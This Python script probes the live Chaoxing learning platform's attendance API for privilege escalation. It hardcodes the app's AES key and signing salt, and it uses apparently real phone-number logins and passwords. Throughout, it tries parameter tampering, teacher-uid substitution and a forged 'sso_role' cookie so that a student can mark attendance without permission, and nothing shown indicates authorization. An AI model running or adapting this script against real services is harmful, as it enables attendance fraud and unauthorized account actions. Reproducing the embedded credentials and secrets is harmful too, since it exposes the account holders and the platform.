import base64, hashlib, json, os, uuid, requests, urllib3, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

results = []

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass
    try:
        s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except:
        pass
    return s, puid

def safe_json(r):
    try:
        return r.json()
    except:
        return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def rec(tag, detail, evidence=""):
    results.append({"tag": tag, "detail": detail, "evidence": evidence[:600]})
    print(f"  {tag}: {detail[:120]}")

def run():
    print("=" * 80)
    print(f"签到状态修改漏洞深入测试 - updateSignStatus API")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录账号...")
    s_teacher, puid_t = login("19712720708", "3.1415926Cpy")
    s_student, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    print("\n[2] 获取课程列表...")
    r = s_teacher.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    d = safe_json(r)
    courses = []
    for ch in d.get("channelList", []):
        c = ch.get("content", {})
        course = c.get("course", {}).get("data", [{}])[0] if c.get("course", {}).get("data") else {}
        if course.get("id"):
            courses.append({
                "courseid": str(course.get("id", "")),
                "classid": str(c.get("id", "")),
                "cpi": str(c.get("cpi", "")),
                "name": c.get("name", "") or course.get("name", ""),
                "roletype": c.get("roletype", 0),
                "bbsid": str(c.get("bbsid", "")),
            })
    target = None
    for c in courses:
        print(f"  课程: name={c['name']}, courseid={c['courseid']}, classid={c['classid']}, cpi={c['cpi']}, roletype={c['roletype']}")
        if c['classid'] == "132821141" or "111" in c['name'] or "exam" in c['name'].lower():
            target = c

    if not target:
        target = courses[0] if courses else {"courseid": "257485372", "classid": "132821141", "cpi": "", "roletype": 3}
        print(f"  未找到目标课程，使用默认值")
    else:
        print(f"\n  目标课程: {target['name']}, courseId={target['courseid']}, classId={target['classid']}, cpi={target['cpi']}")

    course_id = target["courseid"]
    class_id = target["classid"]
    cpi = target["cpi"]

    print("\n[3] 获取签到活动列表...")
    r = s_teacher.get("https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist",
                      params={"courseId": course_id, "classId": class_id, "uid": puid_t}, timeout=20)
    d = safe_json(r)
    active_ids = []
    if isinstance(d, dict) and "activeList" in d:
        for item in d["activeList"]:
            aid = str(item.get("id", ""))
            atype = item.get("activeType", "")
            status = item.get("status", "")
            name = item.get("nameOne", "")
            active_ids.append({"id": aid, "type": str(atype), "status": str(status), "name": name})
            print(f"  活动: id={aid}, type={atype}, status={status}, name={name}")
    else:
        print(f"  活动列表: {r.text[:300]}")

    if not active_ids:
        print("  活动列表为空，尝试获取所有历史活动...")
        r = s_teacher.get("https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist",
                          params={"courseId": course_id, "classId": class_id, "uid": puid_t, "page": "1", "pageSize": "100"}, timeout=20)
        d = safe_json(r)
        if isinstance(d, dict) and "activeList" in d:
            for item in d["activeList"]:
                aid = str(item.get("id", ""))
                active_ids.append({"id": aid, "type": str(item.get("activeType", "")), "status": str(item.get("status", "")), "name": item.get("nameOne", "")})
                print(f"  活动: id={aid}, type={item.get('activeType','')}, status={item.get('status','')}")

    if not active_ids:
        active_ids = [
            {"id": "5000163767353", "type": "2", "status": "2", "name": "普通签到"},
            {"id": "5000139908007", "type": "2", "status": "2", "name": "手势签到"},
            {"id": "5000139505593", "type": "2", "status": "2", "name": "位置签到"},
        ]
        print("  使用已知活动ID")

    test_aid = active_ids[0]["id"]
    print(f"\n  使用活动ID={test_aid}进行测试")

    base = "https://mobilelearn.chaoxing.com"
    ajax_hdr = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest"}

    print("\n" + "=" * 80)
    print("[4] updateSignStatus API 参数探索")
    print("=" * 80)

    param_combos = [
        {"activeId": test_aid, "status": "1"},
        {"activeId": test_aid, "uid": puid_s, "status": "1"},
        {"activeId": test_aid, "classId": class_id, "courseId": course_id, "status": "1"},
        {"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_s, "status": "1"},
        {"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_t, "studentId": puid_s, "status": "1"},
        {"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_t, "studentId": puid_s, "signStatus": "1"},
        {"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_t, "studentId": puid_s, "signResultType": "1"},
        {"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_t, "stuId": puid_s, "status": "1"},
        {"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_t, "userId": puid_s, "status": "1"},
        {"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_t, "studentUid": puid_s, "status": "1"},
        {"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_t, "studentId": puid_s, "status": "1", "type": "1"},
        {"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_t, "studentId": puid_s, "status": "1", "operateSource": "2"},
        {"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_t, "studentId": puid_s, "status": "1", "sourceType": "1"},
    ]

    for i, params in enumerate(param_combos):
        r = s_teacher.post(f"{base}/pptSign/updateSignStatus", data=params, headers=ajax_hdr, timeout=20)
        param_desc = ", ".join(f"{k}={v}" for k, v in params.items() if k != "activeId")
        rec(f"T4-{i:02d}", f"教师 updateSignStatus ({param_desc}): {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[5] 学生越权调用 updateSignStatus - 参数篡改")
    print("=" * 80)

    student_bypass_tests = [
        ({"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_s, "studentId": puid_s, "status": "1"},
         "学生修改自己状态"),
        ({"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_s, "studentId": puid_s, "status": "1", "role": "1"},
         "学生+role=1"),
        ({"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_t, "studentId": puid_s, "status": "1"},
         "学生+uid=教师puid"),
        ({"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_s, "studentId": puid_s, "status": "1", "roletype": "1"},
         "学生+roletype=1"),
    ]

    if cpi:
        student_bypass_tests.append(
            ({"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_s, "studentId": puid_s, "status": "1", "cpi": cpi},
             "学生+教师cpi"))

    for i, (params, desc) in enumerate(student_bypass_tests):
        r = s_student.post(f"{base}/pptSign/updateSignStatus", data=params, headers=ajax_hdr, timeout=20)
        rec(f"T5-{i:02d}", f"学生越权 ({desc}): {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[6] 学生Cookie篡改后调用 updateSignStatus")
    print("=" * 80)

    s_mod = requests.Session()
    s_mod.verify = False
    s_mod.headers.update(s_student.headers)
    for c in s_student.cookies:
        s_mod.cookies.set(c.name, c.value, domain=c.domain, path=c.path)
    s_mod.cookies.set("sso_role", "1", domain=".chaoxing.com", path="/")

    r = s_mod.post(f"{base}/pptSign/updateSignStatus",
                   data={"activeId": test_aid, "classId": class_id, "courseId": course_id,
                         "uid": puid_s, "studentId": puid_s, "status": "1"},
                   headers=ajax_hdr, timeout=20)
    rec("T6-01", f"学生+sso_role=1 调用updateSignStatus: {r.text[:100]}", r.text[:300])

    r = s_mod.post(f"{base}/pptSign/updateSignStatus",
                   data={"activeId": test_aid, "classId": class_id, "courseId": course_id,
                         "uid": puid_t, "studentId": puid_s, "status": "1"},
                   headers=ajax_hdr, timeout=20)
    rec("T6-02", f"学生+sso_role=1+uid=教师puid: {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[7] updateSignStatus API 不同签到活动测试")
    print("=" * 80)

    for act in active_ids[:5]:
        aid = act["id"]
        r = s_teacher.post(f"{base}/pptSign/updateSignStatus",
                           data={"activeId": aid, "classId": class_id, "courseId": course_id,
                                 "uid": puid_t, "studentId": puid_s, "status": "1"},
                           headers=ajax_hdr, timeout=20)
        rec(f"T7-{aid}", f"教师 updateSignStatus (aid={aid}, type={act['type']}, status={act['status']}): {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[8] signedResult API 详细探测")
    print("=" * 80)

    r = s_teacher.get(f"{base}/pptSign/signedResult",
                      params={"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_t, "type": "1"},
                      headers={"Referer": "https://mobilelearn.chaoxing.com/"}, timeout=20)
    rec("T8-01", f"教师 GET signedResult (type=1): HTTP {r.status_code}, len={len(r.text)}", r.text[:300])

    r = s_teacher.get(f"{base}/pptSign/signedResult",
                      params={"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_t},
                      headers={"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest"},
                      timeout=20)
    rec("T8-02", f"教师 GET signedResult (AJAX): HTTP {r.status_code}, len={len(r.text)}", r.text[:300])

    print("\n" + "=" * 80)
    print("[9] preSign页面详细分析")
    print("=" * 80)

    r = s_teacher.get(f"{base}/newsign/preSign",
                      params={"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_t},
                      timeout=20)
    rec("T9-01", f"教师 GET newsign/preSign: HTTP {r.status_code}, len={len(r.text)}", r.text[:500])

    r = s_student.get(f"{base}/newsign/preSign",
                      params={"activeId": test_aid, "classId": class_id, "courseId": course_id, "uid": puid_s},
                      timeout=20)
    rec("T9-02", f"学生 GET newsign/preSign: HTTP {r.status_code}, len={len(r.text)}", r.text[:500])

    for act in active_ids[:3]:
        aid = act["id"]
        r = s_student.get(f"{base}/newsign/preSign",
                          params={"activeId": aid, "classId": class_id, "courseId": course_id, "uid": puid_s},
                          timeout=20)
        page_text = r.text
        has_signstatus = "signstatus" in page_text
        has_location = "latitude" in page_text or "longitude" in page_text
        rec(f"T9-preSign-{aid}", f"学生 preSign (aid={aid}): HTTP {r.status_code}, len={len(page_text)}, signstatus={has_signstatus}, location={has_location}",
            page_text[:300] if len(page_text) < 500 else page_text[:500])

    print("\n" + "=" * 80)
    print("[10] 尝试通过preSign页面JS发现签到状态修改API")
    print("=" * 80)

    for act in active_ids[:3]:
        aid = act["id"]
        r = s_student.get(f"{base}/newsign/preSign",
                          params={"activeId": aid, "classId": class_id, "courseId": course_id, "uid": puid_s},
                          timeout=20)
        if r.status_code == 200 and len(r.text) > 100:
            import re
            api_matches = re.findall(r'/pptSign/\w+', r.text)
            api_matches2 = re.findall(r'/ppt/activeAPI/\w+', r.text)
            api_matches3 = re.findall(r'/sign/\w+', r.text)
            all_apis = set(api_matches + api_matches2 + api_matches3)
            if all_apis:
                rec(f"T10-{aid}", f"preSign页面中发现API: {', '.join(all_apis)}", str(all_apis))

            status_matches = re.findall(r'signstatus\s*=\s*["\']?(\d+)["\']?', r.text)
            if status_matches:
                rec(f"T10-status-{aid}", f"preSign页面signstatus值: {status_matches}", str(status_matches))

    print("\n" + "=" * 80)
    print("[11] 学生尝试通过stuSignajax修改签到状态（添加status参数）")
    print("=" * 80)

    for act in active_ids[:3]:
        aid = act["id"]
        r = s_student.get(f"{base}/pptSign/stuSignajax",
                          params={"activeId": aid, "uid": puid_s, "clientip": "", "latitude": "-1",
                                  "longitude": "-1", "appType": "15", "fid": "0", "status": "1"},
                          timeout=20)
        rec(f"T11-{aid}", f"学生 stuSignajax+status=1 (aid={aid}): {r.text[:100]}", r.text[:300])

        r = s_student.post(f"{base}/pptSign/stuSignajax",
                           data={"activeId": aid, "uid": puid_s, "clientip": "", "latitude": "-1",
                                 "longitude": "-1", "appType": "15", "fid": "0", "status": "1",
                                 "signStatus": "1"},
                           headers=ajax_hdr, timeout=20)
        rec(f"T11-post-{aid}", f"学生 POST stuSignajax+status=1 (aid={aid}): {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[12] V2 API探索")
    print("=" * 80)

    v2_apis = [
        ("GET", f"{base}/v2/apis/active/student/activelist", {"courseId": course_id, "classId": class_id, "uid": puid_s}),
        ("GET", f"{base}/v2/apis/active/teacher/activelist", {"courseId": course_id, "classId": class_id, "uid": puid_t}),
        ("GET", f"{base}/v2/apis/sign/student/sign", {"activeId": test_aid, "uid": puid_s}),
        ("GET", f"{base}/v2/apis/sign/teacher/sign", {"activeId": test_aid, "uid": puid_t}),
        ("POST", f"{base}/v2/apis/sign/student/sign", {"activeId": test_aid, "uid": puid_s, "status": "1"}),
        ("POST", f"{base}/v2/apis/sign/teacher/sign", {"activeId": test_aid, "uid": puid_t, "studentId": puid_s, "status": "1"}),
        ("POST", f"{base}/v2/apis/sign/updateStatus", {"activeId": test_aid, "uid": puid_s, "status": "1"}),
        ("GET", f"{base}/v2/apis/sign/updateStatus", {"activeId": test_aid, "uid": puid_s, "status": "1"}),
    ]

    for i, (method, url, params) in enumerate(v2_apis):
        try:
            if method == "GET":
                r = s_student.get(url, params=params, timeout=20)
            else:
                r = s_student.post(url, data=params, headers=ajax_hdr, timeout=20)
            rec(f"T12-{i:02d}", f"V2 API {method} {url.split('/')[-1]}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])
        except Exception as e:
            rec(f"T12-{i:02d}", f"V2 API ERROR: {e}")

    print("\n" + "=" * 80)
    print("[13] 保存结果")
    print("=" * 80)

    report_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "deep_sign_vuln_results.json")
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"  结果已保存到: {report_file}")
    print(f"  共 {len(results)} 项测试")

    vuln_count = sum(1 for r in results if "成功" in r.get("detail", "") or "success" in r.get("evidence", "").lower())
    perm_count = sum(1 for r in results if "无权限" in r.get("detail", "") or "无权限" in r.get("evidence", ""))
    fail_count = sum(1 for r in results if "修改失败" in r.get("detail", "") or "修改失败" in r.get("evidence", ""))
    print(f"  成功: {vuln_count}, 权限拒绝: {perm_count}, 修改失败: {fail_count}")

if __name__ == "__main__":
    run()
